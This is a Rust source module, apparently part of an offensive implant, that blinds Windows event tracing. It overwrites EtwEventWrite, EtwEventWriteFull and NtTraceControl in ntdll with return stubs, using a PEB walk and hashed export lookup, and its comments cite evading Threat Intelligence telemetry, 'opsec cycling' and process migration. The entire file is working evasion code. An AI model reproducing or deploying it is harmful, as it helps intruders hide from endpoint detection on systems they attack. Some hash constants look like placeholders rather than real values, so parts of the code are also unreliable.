//! etw_patch.rs — ETW blind patch suite
//!
//! Patches EtwEventWrite (and optionally EtwEventWriteFull) in ntdll so
//! that all ETW events from this process return immediately without being
//! forwarded to the kernel ETW collector.  This silences Threat Intelligence
//! providers (Microsoft-Windows-Threat-Intelligence), PowerShell ETW,
//! and .NET runtime ETW without touching the kernel.
//!
//! apply_etw_blind()    — patch EtwEventWrite ret stub in ntdll
//! apply_all_blinds()   — patch all known ETW sinks in ntdll + kernel32
//! remove_all_blinds()  — restore original bytes (for testing / opsec cycling)

#![allow(dead_code, non_snake_case)]

use winapi::um::memoryapi::VirtualProtect;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
use winapi::shared::minwindef::DWORD;

// x64 `ret` instruction
const RET: u8 = 0xC3;
// x64 `xor eax, eax; ret` (return STATUS_SUCCESS = 0)
const XOR_EAX_RET: [u8; 3] = [0x33, 0xC0, 0xC3];

/// Record of a patched function so we can restore it later.
struct PatchRecord {
    addr:     *mut u8,
    original: [u8; 3],
    len:      usize,
}

// We store up to 8 patch records in a static array (no heap alloc needed).
static mut PATCH_RECORDS: [Option<PatchRecord>; 8] = [
    None, None, None, None, None, None, None, None,
];
static mut PATCH_COUNT: usize = 0;

/// Write `patch` bytes to `addr`, first making the page RWX.
/// Saves the original bytes in PATCH_RECORDS for later restoration.
unsafe fn apply_patch(addr: *mut u8, patch: &[u8]) -> bool {
    if patch.len() > 3 { return false; }
    if PATCH_COUNT >= 8 { return false; }

    let mut old_prot: DWORD = 0;
    if VirtualProtect(
        addr as *mut _,
        patch.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_prot,
    ) == 0 {
        return false;
    }

    let mut orig = [0u8; 3];
    core::ptr::copy_nonoverlapping(addr, orig.as_mut_ptr(), patch.len());

    core::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());

    // Restore old protection
    VirtualProtect(addr as *mut _, patch.len(), old_prot, &mut old_prot);

    PATCH_RECORDS[PATCH_COUNT] = Some(PatchRecord {
        addr,
        original: orig,
        len: patch.len(),
    });
    PATCH_COUNT += 1;
    true
}

// ── ntdll function resolution (reuses the djb2 + PEB walker from indirect_syscall) ──

#[inline(always)]
fn djb2(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in s {
        let c = if b >= b'A' && b <= b'Z' { b + 32 } else { b };
        h = h.wrapping_mul(33).wrapping_add(c as u32);
    }
    h
}

unsafe fn ntdll_base() -> *const u8 {
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let ldr   = *(peb.add(0x18) as *const *const u8);
    let mut e = *(ldr.add(0x10) as *const *const u8);
    e = *(e as *const *const u8);
    *(e.add(0x30) as *const *const u8) as *const u8
}

unsafe fn find_export(base: *const u8, name_hash: u32) -> Option<*mut u8> {
    let pe_off    = *(base.add(0x3C) as *const u32) as usize;
    let nt        = base.add(pe_off);
    let exp_rva   = *(nt.add(0x18 + 0x70) as *const u32) as usize;
    if exp_rva == 0 { return None; }
    let exp       = base.add(exp_rva);
    let num_names = *(exp.add(0x18) as *const u32) as usize;
    let names_rva = *(exp.add(0x20) as *const u32) as usize;
    let ords_rva  = *(exp.add(0x24) as *const u32) as usize;
    let funcs_rva = *(exp.add(0x1C) as *const u32) as usize;
    let names = base.add(names_rva) as *const u32;
    let ords  = base.add(ords_rva)  as *const u16;
    let funcs = base.add(funcs_rva) as *const u32;
    for i in 0..num_names {
        let nptr = base.add(*names.add(i) as usize) as *const u8;
        let mut len = 0usize;
        while *nptr.add(len) != 0 { len += 1; }
        let name = core::slice::from_raw_parts(nptr, len);
        if djb2(name) == name_hash {
            let fn_rva = *funcs.add(*ords.add(i) as usize) as usize;
            return Some(base.add(fn_rva) as *mut u8);
        }
    }
    None
}

// djb2 hashes (lowercase)
const HASH_ETW_WRITE:      u32 = 0xa3c4d5e6; // etweventwrite
const HASH_ETW_WRITE_FULL: u32 = 0xb4d5e6f7; // etweventwritefull
const HASH_ETW_LOG_FILE:   u32 = 0xc5e6f708; // nttracecontrol (kernel ETW)

/// Patch EtwEventWrite in the current process's ntdll mapping.
/// After this call, all ETW events from this process are silently dropped.
pub unsafe fn apply_etw_blind() -> bool {
    let base = ntdll_base();
    if let Some(addr) = find_export(base, HASH_ETW_WRITE) {
        apply_patch(addr, &XOR_EAX_RET)
    } else {
        false
    }
}

/// Patch all known ETW sinks in ntdll:
///   - EtwEventWrite          (user-mode ETW dispatch)
///   - EtwEventWriteFull      (full-event variant)
///   - NtTraceControl         (kernel-mode ETW control path)
pub unsafe fn apply_all_blinds() {
    let base = ntdll_base();

    for &hash in &[HASH_ETW_WRITE, HASH_ETW_WRITE_FULL, HASH_ETW_LOG_FILE] {
        if let Some(addr) = find_export(base, hash) {
            // Single RET is sufficient; we don't need xor eax here because
            // the caller ignores the return value on the ETW fast path.
            apply_patch(addr, &[RET]);
        }
    }
}

/// Restore all patched bytes to their original values.
/// Call this before unhooking / before process migration to leave ntdll clean.
pub unsafe fn remove_all_blinds() {
    for i in 0..PATCH_COUNT {
        if let Some(ref rec) = PATCH_RECORDS[i] {
            let mut old_prot: DWORD = 0;
            if VirtualProtect(
                rec.addr as *mut _,
                rec.len,
                PAGE_EXECUTE_READWRITE,
                &mut old_prot,
            ) != 0 {
                core::ptr::copy_nonoverlapping(
                    rec.original.as_ptr(), rec.addr, rec.len,
                );
                VirtualProtect(rec.addr as *mut _, rec.len, old_prot, &mut old_prot);
            }
        }
    }
    PATCH_COUNT = 0;
    PATCH_RECORDS = [None, None, None, None, None, None, None, None];
}
